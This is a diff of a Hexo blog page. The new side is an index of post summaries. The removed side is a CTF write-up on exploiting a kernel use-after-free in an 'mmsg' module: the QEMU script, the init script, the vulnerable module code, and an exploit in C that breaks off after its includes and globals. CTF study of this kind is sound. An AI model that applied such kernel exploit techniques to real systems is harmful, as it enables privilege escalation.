@@ -1,254 +1,741 @@
-<!doctype html>
-<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>haoy&#039;s blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="haoy&#039;s blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="haoy&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="A student in HUST"><meta property="og:type" content="website"><meta property="og:title" content="haoy&#039;s blog"><meta property="og:url" content="https://ha0-y.github.io/"><meta property="og:site_name" content="haoy&#039;s blog"><meta property="og:description" content="A student in HUST"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://ha0-y.github.io/img/og_image.png"><meta property="article:author" content="haoy"><meta property="article:tag" content="Blog"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://ha0-y.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://ha0-y.github.io"},"headline":"haoy's blog","image":["https://ha0-y.github.io/img/og_image.png"],"author":{"@type":"Person","name":"haoy"},"publisher":{"@type":"Organization","name":"haoy's blog","logo":{"@type":"ImageObject","url":"https://ha0-y.github.io/img/logo.png"}},"description":"A student in HUST"}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/googlecode.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
-  (function () {
-      function switchTab() {
-          if (!location.hash) {
-            return;
-          }
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-          const id = '#' + CSS.escape(location.hash.substring(1));
-          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
-          if (!$tabMenu) {
-            return;
-          }
+<link rel="stylesheet" href="/css/main.css">
 
-          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
-          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
-          Array.from($tabMenuContainer.querySelectorAll('a'))
-              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
-              .forEach($content => $content.classList.add('is-hidden'));
 
-          if ($tabMenu) {
-              $tabMenu.parentElement.classList.add('is-active');
-          }
-          const $activeTab = document.querySelector(id);
-          if ($activeTab) {
-              $activeTab.classList.remove('is-hidden');
-          }
-      }
-      switchTab();
-      window.addEventListener('hashchange', switchTab, false);
-  })();
-  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="haoy&#039;s blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/archives">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-07-28T07:57:40.221Z" title="2023/7/28 15:57:40">2023-07-28</time>发表</span><span class="level-item"><time dateTime="2023-08-01T12:13:59.882Z" title="2023/8/1 20:13:59">2023-08-01</time>更新</span><span class="level-item"><a class="link-muted" href="/categorievariants/kernel-uaf/">kernel uaf</a></span><span class="level-item">24 分钟读完 (大约3637个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/07/28/peekgeek%20mmsg/">peekgeek mmsg</a></p><div class="content"><blockquote>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ha0-y.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":18,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="personal blog">
+<meta property="og:url" content="https://ha0-y.github.io/index.html">
+<meta property="og:site_name" content="personal blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Ha0Y">
+<meta property="article:tag" content="Blog">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://ha0-y.github.io/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>personal blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">personal blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">I'm possible</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ha0Y">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="personal blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">程序保护机制</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-26 08:41:07" itemprop="dateCreated datePublished" datetime="2023-08-26T08:41:07+08:00">2023-08-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-01 17:33:48" itemprop="dateModified" datetime="2023-09-01T17:33:48+08:00">2023-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categorievariants/%E7%BC%93%E8%A7%A3%E6%9C%BA%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">缓解机制</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>程序保护机制学习</p>
+</blockquote>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2023/07/28/peekgeek%20mmsg/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ha0Y">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="personal blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/28/peekgeek%20mmsg/" class="post-title-link" itemprop="url">peekgeek mmsg</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-28 15:57:40" itemprop="dateCreated datePublished" datetime="2023-07-28T15:57:40+08:00">2023-07-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-01 17:29:37" itemprop="dateModified" datetime="2023-09-01T17:29:37+08:00">2023-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categorievariants/kernel-uaf/" itemprop="url" rel="index"><span itemprop="name">kernel uaf</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>17k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>31 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
 <p>做题踩坑实录，赛后复现.</p>
 </blockquote>
-<h2 id="step1-init"><a href="#step1-init" class="headerlink" title="step1: init"></a>step1: init</h2><ul>
-<li><p>拿到附件，查看启动脚本，smep, smap, kaslr，应该还有pti</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu host,+smep,+smap \</span><br><span class="line">        -smp cores=1 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -hda rootfs.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor none \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -enable-kvm \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>ext4 镜像挂载</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"></span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看init， etc&#x2F;init.d 下的文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chmod</span> 700 /root</span><br><span class="line"><span class="built_in">chown</span> -R ctf:ctf /home/ctf</span><br><span class="line"><span class="built_in">chown</span> root:root /root/flag</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"></span><br><span class="line">insmod /root/mmsg.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/mmsg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"><span class="comment"># setsid cttyhack su ctf -c /bin/sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>修改内容，将ko文件拷贝一份，etc&#x2F;init.d&#x2F;rcS内容修改一下，然后umount，启动。（修改效果生效必须要<strong>umount</strong>）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount ./rootfs</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>内核版本 <code>5.10.186</code></p>
-</li>
-</ul>
-<h2 id="step2-ko"><a href="#step2-ko" class="headerlink" title="step2: ko"></a>step2: ko</h2><ul>
-<li><p>逆向分析ko文件（直接给出了c文件，也可以不看）。漏洞所在的地方，类似入门经典题目<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>。但是结构体大小0x20</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> *<span class="title">mmsg_head</span>;</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">mmsg_device</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> &#123;</span><br><span class="line">    kfree(mmsg_head);</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mmsg_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    mmsg_device.minor = MISC_DYNAMIC_MINOR;</span><br><span class="line">    mmsg_device.name = DEVICE_NAME;</span><br><span class="line">    mmsg_device.fops = &amp;module_fops;</span><br><span class="line">    misc_register(&amp;mmsg_device);</span><br><span class="line">    mmsg_head = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_head), GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strncpy</span>(mmsg_head-&gt;description, DEVICE_NAME <span class="string">&quot;-mmsg_head&quot;</span>, <span class="number">15</span>);</span><br><span class="line">    INIT_LIST_HEAD(&amp;mmsg_head-&gt;<span class="built_in">list</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mmsg_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;mmsg_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li></li>
-</ul>
-<h2 id="step3-exploit"><a href="#step3-exploit" class="headerlink" title="step3: exploit"></a>step3: exploit</h2><ul>
-<li>尝试ROP，但是不太会🤡</li>
-</ul>
-<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>原文内容： <a target="_blank" rel="noopener" href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">「PWN」内核 PWN 题目的第一次尝试</a></p>
-<ul>
-<li><p>像，很像呀。看了一下，发现及其类似，于是尝试使用类似的exp进行做</p>
-</li>
-<li><p>调试，找地址，先关闭kaslr，通过泄露获得offset</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  gcc exp.c -static -o exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev_name = <span class="string">&quot;/dev/mmsg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 